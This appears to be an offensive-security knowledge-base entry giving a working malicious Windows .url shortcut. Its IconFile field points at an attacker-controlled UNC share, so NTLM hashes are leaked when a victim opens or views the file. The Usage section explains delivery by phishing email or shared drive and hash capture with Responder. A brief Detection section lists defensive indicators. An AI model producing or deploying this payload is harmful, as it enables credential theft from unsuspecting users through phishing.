---
type: code
language: ini
verified: true
tags:
  - phishing-payload
  - url-shortcut
  - ntlm-trigger
platforms:
  - Windows
validated: true
---

# malicious-url-file-with-unc-icon

## Code

```ini
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\10.10.10.10\%USERNAME%.icon
IconIndex=1
```

## Description

This INI-formatted code snippet creates a malicious Internet shortcut (.url) file that, when opened on a Windows system, attempts to load an icon from an attacker-controlled UNC share, triggering NTLM authentication for credential capture in SCF/URL attacks.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| whatever (URL) | Placeholder for the visible URL the shortcut points to | https://example.com |
| whatever (WorkingDirectory) | Placeholder for the shortcut's working directory | C:\\Users\\Public |
| \\10.10.10.10\%USERNAME%.icon (IconFile) | UNC path to attacker share; %USERNAME% expands to victim's username | \\192.168.1.100\share\%USERNAME%.icon |
| 1 (IconIndex) | Index of the icon in the file (typically 1 for default) | 1 |

## Usage

Save this content to a file with .url extension (e.g., link.url) using a text editor or command like echo. Deliver via email attachment, shared drive, or phishing link. When the victim double-clicks or browses to it in Explorer, the icon fetch authenticates to the UNC path, allowing hash capture with Responder.

## Detection

- File creation events in Windows (Event ID 4663) for .url files with suspicious IconFile paths.
- Network logs showing SMB connections to internal IPs with icon fetches.
- Antivirus signatures for known malicious .url patterns or YARA rules matching UNC icon paths.
- EDR alerts on WebClient service activity to unusual UNC paths.

## Related

- [[procedures/SCF-URL-File-Attack-Against-Writable-Share]]
- [[tools/Responder]]
